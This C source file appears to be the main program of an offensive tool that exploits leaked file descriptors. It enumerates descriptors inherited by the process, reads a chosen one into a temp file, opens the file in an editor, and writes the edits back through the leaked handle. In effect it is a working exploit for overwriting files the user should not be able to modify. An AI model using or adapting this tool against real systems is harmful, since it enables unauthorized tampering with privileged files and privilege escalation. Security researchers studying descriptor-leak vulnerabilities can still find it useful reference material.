#include <stdio.h>
#include "constants.h"
#include "proc.h"
#include "prompts.h"

#include <fcntl.h> 
#include <errno.h> 

ssize_t read_fd_to_temp_file(int fd) {
    int tmp_fd = 0 ;
    ssize_t readsize = 0;
    ssize_t totalbytes = 0;
    char buffer[1024];

    memset(buffer, 0, sizeof buffer);

    printf(" [\033[34;1m*\033[0m] Reading FD %d to %s...\n", fd, TMP_FILE);

    // open a temp file to store the file contents
    // in a place we can edit them.
    tmp_fd = open(TMP_FILE, O_CREAT  | O_TRUNC | O_WRONLY, S_IRUSR | S_IWUSR);
    if (tmp_fd < 0) {
        perror(" [\033[31;1m-\033[0m] Unable to open temp file");
    }

    // Seek the leaked fd to zero.
    lseek(fd, 0, SEEK_SET);
    //fcntl(fd, F_SETFL, O_NONBLOCK);
        
    while((readsize = read(fd, buffer, sizeof buffer)) > 0) {
        totalbytes += readsize;
        write(tmp_fd, buffer, readsize);
        memset(buffer, 0, sizeof buffer);
    }
    close(tmp_fd);
    return totalbytes;
}

ssize_t write_temp_file_to_fd(int fd) {
    int tmp_fd = 0 ;
    ssize_t readsize = 0;
    ssize_t totalbytes = 0;
    char buffer[1024];

    memset(buffer, 0, sizeof buffer);

    printf(" [\033[34;1m*\033[0m] Writing %s to FD %d ...\n", TMP_FILE, fd);

    // open a temp file that was edited.
    tmp_fd = open(TMP_FILE, O_RDONLY);
    if (tmp_fd < 0) {
        perror(" [\033[31;1m-\033[0m] Unable to open temp file");
    }

    // Seek the leaked fd to zero.
    lseek(fd, 0, SEEK_SET);
    //fcntl(fd, F_SETFL, O_NONBLOCK);
        
    while((readsize = read(tmp_fd, buffer, sizeof buffer)) > 0) {
        totalbytes += readsize;
        write(fd, buffer, readsize);
        memset(buffer, 0, sizeof buffer);
    }
    close(tmp_fd);
    return totalbytes;
}

int main(int argc, char **argv) {
    ssize_t bytes_read = 0;
    ssize_t bytes_written = 0;
    t_fd_info *target_record = NULL;
    t_list list;

    puts(BANNER);
    
    // Initalize the list
    list.count = 0;
    list.head = NULL;
    list.cur = NULL;

    // Determine how many items there are that might be of interest.
    get_proc_fd_info_count(&list);
    if (!list.count) {
        printf(" [\033[31;1m-\033[0m] \033[31;1mERROR: Not seeing any leaked file descriptors.\033[0m\n");
        return 1;
    }

    // Ask the user which record that they want to edit.
    puts(" [\033[32;1m+\033[0m] \033[32;1mIntersting FDs found!\033[0m");
    target_record = get_record_at_offset(&list, prompt_which_fd(&list));

    // Read the fd data into a temp file.
    bytes_read = read_fd_to_temp_file(target_record->fd);
    printf(" [\033[34;1m*\033[0m] Total bytes read: %d\n", bytes_read);
    if (!bytes_read) perror("[\033[31;m-\033[0m] Failed to read data");

    // Open the temp file with an editor
    system(EDIT_CMD);

    // Ask the user if they want to overwrite the
    // edits to the original file. If so, do the write.
    if (prompt_confirm_overwrite()) {

        // Write the data to the dangling file pointer
        bytes_written = write_temp_file_to_fd(target_record->fd);
        printf(" [\033[34;1m*\033[0m] Total bytes written: %d\n", bytes_written);
    }
    
    // Free our allocated memory.
    free_list(&list);

    // And exit.
    printf(" [\033[32;1m+\033[0m] \033[32;1mDone Son!\n\033[0m");
    return 0;
}

